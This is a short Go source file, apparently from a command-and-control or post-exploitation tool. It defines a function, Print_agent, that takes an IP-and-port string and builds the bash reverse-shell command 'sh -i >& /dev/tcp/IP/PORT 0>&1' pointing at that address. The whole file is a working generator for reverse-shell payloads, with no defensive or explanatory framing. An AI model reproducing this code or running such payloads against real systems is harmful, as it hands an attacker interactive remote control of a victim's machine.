package agents

import (
	"strings"
)

func Print_agent(bind string) string {
	//split bind into ip and port
	ip := strings.Split(bind, ":")[0]
	port := strings.Split(bind, ":")[1]
	if ip == "localhost" {
		ip = "127.0.0.1"
	}
	var cmd = "sh -i >& /dev/tcp/" + string(ip) + "/" + string(port) + " 0>&1"

	return cmd

}
